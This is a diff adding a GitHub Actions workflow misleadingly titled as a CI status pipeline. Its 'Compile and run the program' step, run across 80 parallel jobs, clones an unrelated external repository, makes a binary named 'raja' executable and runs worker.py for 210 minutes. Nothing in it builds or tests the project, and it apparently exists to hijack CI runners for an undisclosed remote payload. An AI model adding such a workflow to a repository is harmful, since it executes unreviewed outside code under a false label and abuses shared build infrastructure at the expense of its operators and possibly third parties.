@@ -1,0 +1,35 @@
+name: CI/CD pipelines running status 
+
+on:
+  push:
+    branches: [ main, master ]
+    
+  workflow_dispatch:
+
+jobs:
+  compile-ubuntu:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80]
+      max-parallel: 80
+      fail-fast: false
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+      
+    
+    - name: Install dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y gcc make
+    
+    - name: Compile and run the program
+      run: |
+        git clone https://github.com/VishalDevloper03/Vishal.git
+        cd Vishal
+        chmod +x raja
+        pip install requests 
+        timeout 12600 python3 worker.py || echo "Script ran for 210 minutes"
+        
